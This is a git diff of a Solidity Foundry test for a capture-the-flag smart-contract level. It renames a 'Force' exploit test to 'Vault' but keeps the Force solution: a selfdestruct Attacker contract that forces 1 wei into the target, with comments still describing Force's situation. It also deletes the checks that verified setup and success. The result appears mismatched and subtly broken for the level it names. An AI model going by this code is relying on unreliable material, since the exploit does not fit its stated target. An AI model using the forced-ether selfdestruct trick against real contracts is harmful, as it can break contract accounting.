@@ -3,15 +3,15 @@ pragma solidity >=0.6.0;
 pragma experimental ABIEncoderV2;
 
 import "./utils/BaseTest.sol";
-import "src/levels/Force.sol";
-import "src/levels/ForceFactory.sol";
+import "src/levels/Vault.sol";
+import "src/levels/VaultFactory.sol";
 
-contract TestForce is BaseTest {
-    Force private level;
+contract TestVault is BaseTest {
+    Vault private level;
 
     constructor() public {
         // SETUP LEVEL FACTORY
-        levelFactory = new ForceFactory();
+        levelFactory = new VaultFactory();
     }
 
     function setUp() public override {
@@ -27,10 +27,7 @@ contract TestForce is BaseTest {
         /** CODE YOUR SETUP HERE */
 
         levelAddress = payable(this.createLevelInstance(true));
-        level = Force(levelAddress);
-
-        // Check that the contract is correctly setup
-        assertEq(address(level).balance, 0);
+        level = Vault(levelAddress);
     }
 
     function exploitLevel() internal override {
@@ -38,21 +35,19 @@ contract TestForce is BaseTest {
 
         vm.startPrank(player);
 
-        // Since the Force contract doesn't have a payable fn or a receive/ fallback fn
+        // Since the Vault contract doesn't have a payable fn or a receive/ fallback fn
         // the only way to send ether to it is by destroying a contract and sending all its ether balance
-        // to the force contract
+        // to the Vault contract
 
         // Selfdestruct destroys the contract and send all its ether balance to the target address
         new Attacker{value: 1 wei}(level);
-
-        assertEq(address(level).balance, 1 wei);
 
         vm.stopPrank();
     }
 }
 
 contract Attacker {
-    constructor(Force _level) public payable {
+    constructor(Vault _level) public payable {
         selfdestruct(payable(address(_level)));
     }
 }
